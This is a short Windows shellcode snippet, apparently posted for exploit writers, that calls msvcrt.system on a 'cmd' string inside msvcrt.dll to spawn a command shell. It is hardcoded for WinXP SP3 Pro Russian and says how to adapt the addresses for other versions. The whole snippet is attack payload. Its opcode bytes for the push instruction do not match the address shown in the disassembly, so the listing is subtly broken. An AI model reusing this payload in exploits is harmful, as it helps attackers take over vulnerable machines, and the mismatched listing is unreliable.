68 9D 61 F9 77  push 0x77C01345
B8 C7 93 C1 77  mov eax,msvcrt.system
FF D0           call eax
  
In msvcrt.dll at 0x77C01344 We have string ".cmd", that's the trick.
Code will work in WinXP SP3 Pro Rus, in other versions you'd better search
the string and system(char*) address for yourself.
  
Coded via lord Kelvin.